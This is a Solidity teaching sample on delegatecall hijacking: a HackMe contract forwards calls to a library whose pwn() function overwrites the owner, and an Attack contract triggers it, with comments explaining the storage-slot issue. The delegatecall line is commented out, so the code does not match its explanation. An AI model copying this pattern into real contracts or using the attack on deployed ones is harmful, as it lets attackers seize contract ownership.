


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
    //   address(lib).delegatecall(msg.data);
    
    // Here is the msg.sender is attacker function .
    // So this msg.sender will executes that Hack me contract and go to the lib contract .
    //  storage layout will change
        
    }
}//


contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
        //This will trigger the Fall back function 
    }
}




// HackMe's Setup:

// The HackMe contract has a library Lib that contains a function pwn() which sets owner = msg.sender.
// HackMe uses delegatecall in its fallback function, meaning any function call sent to HackMe but not explicitly defined will be forwarded to Lib, executing code from Lib inside HackMe's storage context.
// Storage Layout Issue:

// The owner variable is at slot 0 in both Lib and HackMe.
// Since delegatecall executes code from Lib within HackMe's context, owner in Lib actually modifies owner in HackMe.
// The Attack Execution:

// The attacker deploys the Attack contract and calls attack(), which sends a low-level call to HackMe with abi.encodeWithSignature("pwn()").
// Since HackMe does not have a pwn() function, it triggers the fallback function.
// The fallback function uses delegatecall to execute pwn() from Lib, but this time in HackMe's storage context.
// pwn() sets owner = msg.sender, but msg.sender in this call is the attacker!
// As a result, the owner of HackMe is now the attacker.
// Key Takeaways:
// delegatecall executes external code but modifies the calling contract’s storage.
// Storage slots must be carefully managed when using external libraries.
// An attacker can take control of a contract if delegatecall is used improperly with an untrusted contract.
// This is known as a delegatecall hijacking attack and is a serious security risk in Solidity smart contracts.